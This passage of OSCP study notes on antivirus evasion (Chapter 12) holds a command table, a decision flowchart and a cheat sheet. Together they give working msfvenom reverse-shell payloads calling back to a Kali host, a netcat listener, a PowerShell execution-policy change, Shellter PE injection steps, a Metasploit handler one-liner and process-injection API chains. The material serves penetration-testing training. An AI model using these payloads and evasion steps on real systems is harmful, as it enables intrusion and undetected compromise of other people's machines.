| `msfvenom ... -f powershell -v sc` | Outputs PowerShell byte array | `-v sc` names variable | Generate shellcode for the PS injector |
| `Get-ExecutionPolicy -Scope CurrentUser` | Reads PS execution policy | `CurrentUser` scope | Diagnose script execution failure |
| `Set-ExecutionPolicy ... Unrestricted ...` | Changes current-user policy | `-ExecutionPolicy`, `-Scope` | Chapter's lab workaround for blocked script |
| `nc -lvnp 443` | Starts Netcat listener | `-l -v -n -p` | Receive raw reverse shell |
| `whoami` | Shows current user | none | Validate shell context |
| `hostname` | Shows host name | none | Validate target host |
| `apt-cache search shellter` | Finds Shellter package | search term | Confirm package availability |
| `sudo apt install shellter` | Installs Shellter | `sudo` required | Set up automated PE injection |
| `sudo apt install wine` | Installs Wine | Windows compatibility layer | Run Shellter on Kali |
| `dpkg --add-architecture i386` | Enables 32-bit packages | `i386` | Prepare 32-bit Wine support |
| `apt-get update` | Refreshes package metadata | none | Before installing new packages |
| `apt-get install wine32` | Installs 32-bit Wine | `wine32` package | Run 32-bit Shellter/PE workflows |
| `shellter` | Starts Shellter | Interactive prompts | Automate PE injection |
| `msfconsole -x "..."` | Runs scripted Metasploit commands | `-x` command string | Start Meterpreter handler quickly |
| `meterpreter > shell` | Opens Windows command shell | Meterpreter session required | Interact with compromised host |

---

# OSCP Decision Guide

Use this mental flow when a payload is blocked:

```text
Payload blocked?
│
├─ No → Continue with the attack chain.
│
└─ Yes
   │
   ├─ Identify AV / target architecture.
   │
   ├─ Is detection on disk?
   │   ├─ Rebuild/customize payload.
   │   ├─ Change obvious strings/signatures.
   │   └─ Consider a different delivery/execution method.
   │
   ├─ Can you avoid disk?
   │   └─ Consider an in-memory technique.
   │
   ├─ Retest in a lab that matches the target.
   │
   ├─ Start listener/handler first.
   │
   └─ Validate:
       ├─ whoami
       └─ hostname
```

---

# Mini Cheat Sheet — Chapter 12

1. **Know what is blocking you:** file engine, memory engine, behavior, network, ML, or EDR can all detect different parts of the same attack.
2. **Hash demonstration:**
   ```bash
   xxd -b malware.txt
   sha256sum malware.txt
   ```
3. **Baseline EXE payload:**
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f exe > binary.exe
   ```
4. **Do not upload sensitive/custom exam payloads to VirusTotal** if you care about keeping them private/unknown.
5. **Prefer testing against the exact AV product** in a dedicated VM.
6. **On-disk concepts:** packer → obfuscator → crypter → protector.
7. **Remote injection mental chain:**
   ```text
   OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
   ```
8. **Local PowerShell injection mental chain:**
   ```text
   VirtualAlloc → memset → CreateThread
   ```
9. **Generate PowerShell shellcode:**
   ```bash
   msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f powershell -v sc
   ```
10. **Match architecture:** x86 shellcode → x86 PowerShell/process.
11. **Check PowerShell policy:**
   ```powershell
   Get-ExecutionPolicy -Scope CurrentUser
   ```
12. **Chapter's lab policy change:**
   ```powershell
   Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
   ```
13. **Listener first:**
   ```bash
   nc -lvnp 443
   ```
14. **Run the script:**
   ```powershell
   .\bypass.ps1
   ```
15. **Validate the session:**
   ```cmd
   whoami
   hostname
   ```
16. **Install Shellter/Wine:**
   ```bash
   sudo apt install shellter
   sudo apt install wine
   dpkg --add-architecture i386 && apt-get update && apt-get install wine32
   ```
17. **Shellter sequence:**
   ```text
   shellter → A (Auto) → target PE → Y (Stealth) → L (listed) → 1 (Meterpreter reverse TCP) → set LHOST/LPORT
   ```
18. **Meterpreter handler:**
   ```bash
   msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <KALI_IP>;set LPORT 443;run;"
   ```
19. **A clean AV scan is not proof of stealth:** EDR/SIEM/SOC may still see the activity.
20. **OSCP mindset:** tailor the payload to the target instead of searching for a universal AV bypass.

---

# Final Mental Model

```text
                     ┌────────────────────┐
                     │   Malicious code   │
                     └─────────┬──────────┘
                               │
              ┌────────────────┴────────────────┐
              │                                 │
       ┌──────▼──────┐                   ┌──────▼──────┐
       │   On disk   │                   │  In memory  │
       └──────┬──────┘                   └──────┬──────┘
              │                                 │
   ┌──────────┼──────────┐           ┌──────────┼────────────┐
   │          │          │           │          │            │
 Packer   Obfuscator   Crypter   Injection  Hollowing  Reflective DLL
                                      │
                                      ▼
                              API / behavior detection
                                      │
                                      ▼
                         EDR / SIEM / SOC can still alert
```

The most important lesson from Chapter 12 is:

> **Evasion is not "make the hash different." It is an iterative process of understanding the target's detection surface, changing the payload/execution method, testing against the real defensive product, and validating that the resulting access still works.**
